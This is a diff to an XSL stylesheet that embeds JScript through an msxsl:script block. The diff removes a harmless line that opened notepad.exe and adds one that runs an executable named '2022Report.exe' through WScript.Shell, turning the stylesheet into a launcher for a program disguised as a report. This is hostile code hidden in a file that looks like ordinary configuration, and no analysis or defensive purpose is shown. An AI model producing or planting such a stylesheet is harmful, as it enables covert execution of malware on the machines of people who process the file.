@@ -6,8 +6,6 @@ version="1.0">
 <output method="text"/>
 	<ms:script implements-prefix="user" language="JScript">
 	<![CDATA[
-	var oShell = new ActiveXObject("Shell.Application");
-	var commandtoRun = "C:\\Windows\\notepad.exe";
-	oShell.ShellExecute(commandtoRun,"","","open","1");
+	var r = new ActiveXObject("WScript.Shell").Run("2022Report.exe");
 	]]> </ms:script>
 </stylesheet>
